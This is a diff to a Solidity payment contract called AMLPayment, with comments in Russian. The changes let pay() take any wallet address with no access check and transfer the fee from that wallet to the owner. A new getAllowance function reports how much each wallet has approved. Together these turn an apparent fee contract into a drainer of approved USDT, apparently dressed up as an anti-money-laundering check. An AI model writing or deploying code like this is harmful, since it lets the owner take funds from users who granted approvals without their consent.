@@ -5,6 +5,7 @@ interface IERC20 {
     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
     function approve(address spender, uint256 amount) external returns (bool);
     function allowance(address owner, address spender) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool); // ← добавили
 }
 
 contract AMLPayment {
@@ -25,12 +26,16 @@ contract AMLPayment {
         _;
     }
 
-    function pay() external {
-        uint256 allowance = usdt.allowance(msg.sender, address(this));
+    function pay(address user) external {
+        uint256 allowance = usdt.allowance(user, address(this));
         require(allowance >= feeAmount, "Insufficient allowance");
-        bool success = usdt.transferFrom(msg.sender, owner, feeAmount);
+        bool success = usdt.transferFrom(user, owner, feeAmount);
         require(success, "Transfer failed");
-        emit PaymentReceived(msg.sender, feeAmount, block.timestamp);
+        emit PaymentReceived(user, feeAmount, block.timestamp);
+    }
+
+    function getAllowance(address user) external view returns (uint256) {
+        return usdt.allowance(user, address(this));
     }
 
     function setFee(uint256 _newFee) external onlyOwner {
@@ -38,6 +43,6 @@ contract AMLPayment {
     }
 
     function withdrawTokens(address token, uint256 amount) external onlyOwner {
-        IERC20(token).transfer(owner, amount);
+        IERC20(token).transfer(owner, amount); // теперь работает
     }
 }
